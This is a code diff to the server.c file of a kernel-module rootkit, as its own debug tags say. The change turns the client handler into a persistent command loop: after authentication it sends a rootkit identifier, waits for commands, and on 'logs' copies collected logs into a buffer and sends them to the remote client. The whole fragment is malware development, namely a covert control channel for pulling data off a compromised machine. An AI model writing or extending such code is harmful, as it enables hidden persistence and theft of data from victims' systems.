@@ -157,8 +157,16 @@ static int client_handler(void){
 		printk("[rootkit][server.c::client_handler] DEBUG    invalid auth message recieved\n\t%s\n", client.message); //DEBUG
 		return -1;
 	}
-	get_logs(client.message); //cpies logs into message buffer
-	printk("[rootkit][server.c::client_handler] DEBUG    read log files\n");  //DEBUG
+	memset(client.message, 0, BUFFER_SIZE); //zeroes out message buffer
+	strcpy(client.message, ROOTKIT_ID);
 	net_send();
-	return 0;
+	while (true){
+		memset(client.message, 0, BUFFER_SIZE); //zeroes out message buffer
+		net_recv();
+		if (strcmp("logs", client.message)==0){
+			get_logs(client.message); //cpies logs into message buffer
+			printk("[rootkit][server.c::client_handler] DEBUG    read log files\n");  //DEBUG
+			net_send();
+		}
+	}
 }
